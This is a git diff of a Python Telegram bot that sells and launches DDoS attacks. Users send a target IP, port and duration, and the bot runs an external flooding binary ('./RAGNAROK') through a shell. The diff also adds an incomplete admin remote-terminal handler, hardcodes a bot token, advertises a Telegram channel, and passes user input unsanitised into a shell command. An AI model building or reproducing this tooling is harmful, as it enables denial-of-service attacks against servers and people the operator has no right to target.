@@ -1,9 +1,10 @@
-#aadiddoserpython
+#aadi2ddoserpython
 
 import telebot
 import subprocess
 import datetime
 import os
+from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7763199485:AAFELzHd_eDNraQgwyICxxhx-HmVkCFScHA')
@@ -77,6 +78,29 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
     
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
+
+# Function to handle terminal commands
+async def execute_terminal(update: Update, context: CallbackContext):
+    global current_directory
+    user_id = update.effective_user.id
+
+    # Restrict access to admin only
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ *You are not authorized to execute terminal commands!*",
+            parse_mode='Markdown'
+        )
+        return
+
+    # Ensure a command is provided
+    if not context.args:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="⚠️ *Usage: /terminal <command>*",
+            parse_mode='Markdown'
+        )
+        return
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
@@ -195,7 +219,7 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-# Function to handle the reply when free users run the /aadi command
+# Function to handle the reply when free users run the /aadi2 command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
@@ -203,12 +227,12 @@ def start_attack_reply(message, target, port, time):
     response = f" 🚀𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧🥶\n🎯𝐈𝐏:{target} \n⛱️️𝙋𝙤𝙧𝙩:{port} \n⌚𝐓𝐢ᴍᴇ:{time}\n JOIN OUR CHANNEL 👇🏻\n᚛ https://t.me/+KWXSknpfd4w2NmJl ᚜"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /aadi command
+# Dictionary to store the last time each user ran the /aadi2 command
 aadi2_cooldown = {}
 
 COOLDOWN_TIME = 0 #  seconds cooldown time
 
-# Handler for /aadi command
+# Handler for /aadi2 command
 @bot.message_handler(commands=['aadi2'])
 def handle_aadi2(message):
     user_id = str(message.chat.id)
@@ -217,7 +241,7 @@ def handle_aadi2(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in aadi2_cooldown and (datetime.datetime.now() - aadi2_cooldown[user_id]).seconds < 10:
-                response = "ᴄᴏᴏʟᴅᴏᴡɴ ᴏɴ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ¼ ᴍɪɴᴜᴛᴇ ᴀɴᴅ ᴜsᴇ ᴀɢᴀɪɴ /aadi2 ᴄᴏᴍᴍᴀɴᴅ❗\nhttps://t.me/user_x_dead "
+                response = "ᴄᴏᴏʟᴅᴏᴡɴ ᴏɴ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ¼ ᴍɪɴᴜᴛᴇ ᴀɴᴅ ᴜsᴇ ᴀɢᴀɪɴ /aadi2 ᴄᴏᴍᴍᴀɴᴅ❗\nhttps://t.me/+KWXSknpfd4w2NmJl "
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -231,10 +255,10 @@ def handle_aadi2(message):
             if time > 201:
                 response = "ᴇʀʀᴏʀ: ᴍᴀx ᴀᴛᴛᴀᴄᴋ sᴇᴄᴏɴᴅ 200sᴇᴄ ❌."
             else:
-                record_command_logs(user_id, "./aadi {target} {port} {time} 975"
+                record_command_logs(user_id, '/aadi2', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sasuke {target} {port} {time}"
+                full_command = f"./RAGNAROK {target} {port} {time} CRACKS"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️\n https://t.me/+KWXSknpfd4w2NmJl"
         else:
